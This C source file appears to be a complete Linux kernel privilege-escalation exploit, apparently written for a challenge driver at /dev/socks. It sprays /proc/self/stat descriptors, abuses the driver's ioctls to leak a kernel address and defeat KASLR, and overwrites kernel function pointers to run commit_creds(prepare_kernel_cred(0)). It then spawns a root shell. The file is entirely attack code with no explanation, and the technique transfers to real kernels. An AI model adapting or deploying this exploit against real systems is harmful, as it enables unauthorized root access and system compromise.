#define _GNU_SOURCE
#include<sched.h>
#include<stdio.h>
#include<stdlib.h>
#include<unistd.h>
#include<sys/mman.h>
#include<string.h>
#include<sys/stat.h>
#include<sys/types.h>
#include<fcntl.h>
#include<errno.h>
#include<sys/wait.h>
#include<pthread.h>
#include<sys/syscall.h>
#include<sys/ioctl.h>
#include<linux/userfaultfd.h>
#include <poll.h>
#include <signal.h>
#include <sys/ipc.h>
#include <sys/msg.h>
#include<sys/socket.h>
#include<sys/xattr.h>
#include <sys/prctl.h>

#define DEVICE_FILE "/dev/socks"
#define ALLOC 0xc0087301ul
#define LISTEN 0xc0407302ul
#define CONNECT 0xc0407303ul
#define FILL 0xc0107304ul
#define LEAK 0xc0107305ul

#define SPRAY 0x100ul

#define LEAK_OFFSET 0x1c1fd0ul

char name[0x40];
int spray_fd[SPRAY];
int target_fd;
int fd1,fd2,fd3,fd4,fd5,fd6;

unsigned long kernel_leak;
unsigned long kernel_base;
unsigned long pivot=0x4141414141414141;
typedef unsigned long __attribute__((regparm(3)))(*commit_creds_func)(unsigned long cred);
typedef unsigned long __attribute__((regparm(3)))(*prepare_kernel_cred_func)(unsigned long cred);
commit_creds_func commit_creds = (commit_creds_func) 0x072150;
prepare_kernel_cred_func prepare_kernel_cred = (prepare_kernel_cred_func) 0x072370;
void privesc(){
	commit_creds(prepare_kernel_cred(0));
}
void set_affinity(int which_cpu)
{
    cpu_set_t cpu_set;
    CPU_ZERO(&cpu_set);
    CPU_SET(which_cpu, &cpu_set);
    if (sched_setaffinity(0, sizeof(cpu_set), &cpu_set) != 0)
    {
        perror("sched_setaffinity()");
        exit(EXIT_FAILURE);
    }
}
void getshell(){
	if(!getuid()){
		puts("[+] Priv esc successful!");
	}
	puts("[+] Shell1!!!!");
	char *args[]={"/bin/sh",NULL}; 
	execve("/bin/sh",args,NULL);
}
struct req_s {
	unsigned long size;
	unsigned long addr;
};
void alloc(int *fd,unsigned long size){
	ioctl(*fd,ALLOC,size);
}
void ioctl_listen(int *fd,char *buf){
	ioctl(*fd,LISTEN,buf);
}
void ioctl_connect(int *fd,char *buf){
	ioctl(*fd,CONNECT,buf);
}
void fill(int *fd,unsigned long size,unsigned long *payload){
	struct req_s req={.size=size,.addr=(unsigned long)payload};
	ioctl(*fd,FILL,(char *)&req);
}
unsigned long leak(int *fd,unsigned long size){
	unsigned long leak_buf[1];
	struct req_s req={.size=size,.addr=(unsigned long)leak_buf};
	ioctl(*fd,LEAK,(char *)&req);
	return leak_buf[0];
}
	
void exploit(){
	set_affinity(0);
	for(int i=0;i<SPRAY;i++){
		spray_fd[i]=open("/proc/self/stat",O_RDONLY);
	}
	for(int i=0;i<0x40;i++){
		name[i]='A';
	}
	fd1=open(DEVICE_FILE,O_RDWR);
	fd2=open(DEVICE_FILE,O_RDWR);
	fd3=open(DEVICE_FILE,O_RDWR);
	fd4=open(DEVICE_FILE,O_RDWR);
	alloc(&fd1,0x30);
	alloc(&fd3,0x30);
	alloc(&fd2,-1);
	alloc(&fd4,-1);
	ioctl_listen(&fd1,name);
	ioctl_connect(&fd2,name);
	ioctl_listen(&fd3,name);
	ioctl_connect(&fd4,name);
	unsigned long payload1[1]={0x4141414141414141};
	fill(&fd1,0x8,payload1);
	close(fd4);
	target_fd=open("/proc/self/stat",O_RDONLY);
	kernel_leak=leak(&fd2,0x8);
	printf("[+] Kernel leak=%p\n",(void *)kernel_leak);
	kernel_base=kernel_leak-LEAK_OFFSET;
	commit_creds+=kernel_base;
	prepare_kernel_cred+=kernel_base;
	printf("[+] Kernel base=%p\n",(void *)kernel_base);
	fd5=open(DEVICE_FILE,O_RDWR);
	fd6=open(DEVICE_FILE,O_RDWR);
	alloc(&fd5,0x30);
	alloc(&fd6,-1);
	ioctl_listen(&fd5,name);
	ioctl_connect(&fd6,name);
	target_fd=open("/proc/self/stat",O_RDONLY);
	unsigned long payload[4]={privesc,privesc,privesc,privesc};
	fill(&fd5,0x20,payload);
	read(target_fd,NULL,0);
	getshell();
}

int main(){
	exploit();
}
